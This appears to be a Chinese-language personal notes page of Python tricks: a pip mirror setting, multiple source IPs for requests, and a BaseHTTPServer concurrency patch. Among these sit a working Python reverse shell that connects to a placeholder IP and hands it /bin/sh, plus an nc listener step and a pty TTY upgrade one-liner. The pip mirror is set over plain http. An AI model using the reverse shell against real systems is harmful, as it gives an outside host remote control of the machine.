#写在前面

嗯哼，Python很好玩呢...记录一点黑科技咯

当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py

----

#设置pip源

```
mkdir -p ~/.pip
echo """
[global]
index-url = http://pypi.doubanio.com/simple/
""">~/.pip/pip.conf
```

#反弹shell

首先自己的服务器上用**nc -l 端口**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(( "IP地址" , 端口 ))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

##获得一个tty

    python -c 'import pty; pty.spawn("/bin/sh")'

----

#让requests使用多个IP

```python
import socket
real_create_conn = socket.create_connection
def set_src_addr(*args):
    address, timeout = args[0], args[1]
    source_address = ( 需要使用的IP , 0)
    return real_create_conn(address, timeout, source_address)
socket.create_connection = set_src_addr
import requests
```

----

#Python多线程模板

[MultiThread_Template.py](code/MultiThread_Template.py)

## BaseHTTPServer并发性改善

> 参考资料：[利用Python中SocketServer 实现客户端与服务器间非阻塞通信](http://blog.csdn.net/cnmilan/article/details/9664823)

> 直接修改BaseHTTPServer的代码中的一个细节，可以大幅度提高使用BaseHTTPServer能支持的并发性

首先找到BaseHTTPServer在哪：

     python -c "import BaseHTTPServer; print(BaseHTTPServer)"

修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py

找到这行：

```
class HTTPServer(SocketServer.TCPServer):
```

修改其继承的父类：

```
class HTTPServer(SocketServer.ThreadingTCPServer):
```

